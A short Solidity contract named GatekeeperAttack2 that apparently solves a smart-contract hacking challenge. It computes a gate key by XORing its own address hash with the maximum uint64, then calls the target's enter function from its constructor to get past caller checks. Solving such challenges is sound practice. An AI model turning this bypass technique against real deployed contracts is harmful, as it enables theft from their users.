// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperAttack2 {
    constructor(address _gatekeeper) {
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (type(uint64).max));

        (bool success, ) = _gatekeeper.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
    }
}
  
